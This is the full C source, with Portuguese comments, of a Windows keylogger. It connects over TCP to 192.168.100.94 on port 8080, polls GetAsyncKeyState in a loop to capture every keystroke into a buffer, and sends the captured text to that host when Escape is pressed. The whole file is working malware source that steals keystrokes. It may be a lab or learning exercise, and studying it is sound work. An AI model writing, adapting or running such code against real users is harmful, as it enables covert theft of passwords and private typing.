#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <strings.h>
#include <rpcndr.h>

#pragma comment(lib, "Ws2_32.lib")

#define BUFFER_SIZE 4096
#define INTERVALO 60
#define PORT 8080

int main()
{

    WSADATA wsaData;
    SOCKET sockfd;
    struct sockaddr_in serv_addr;

    short keyState;
    char buffer[BUFFER_SIZE] = {0};
    size_t len = 0;

    // Criando conexão via sockets
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET)
    {
        printf("Erro ao abrir o socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    serv_addr.sin_addr.s_addr = inet_addr("192.168.100.94");

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        printf("Erro ao conectar: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    printf("Capturando teclas...\n");
    while (1)
    {
        // Loop através das teclas
        for (int key = 8; key <= 255; key++)
        {
            keyState = GetAsyncKeyState(key);

            // Verifica se a tecla foi pressionada
            if (keyState & 0x0001)
            {
                if (len < BUFFER_SIZE - 1)
                {

                    if (key == VK_ESCAPE)
                    {
                        send(sockfd, buffer, strlen(buffer), 0);
                        closesocket(sockfd);
                        WSACleanup();
                        return 0;
                    }

                    char charBuffer = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                    if (charBuffer != 0)
                    { 
                        buffer[len++] = charBuffer;
                    }
                    buffer[len] = '\0';
                }
            }
        }

        Sleep(10); // Evita sobrecarrega da CPU
    }
}
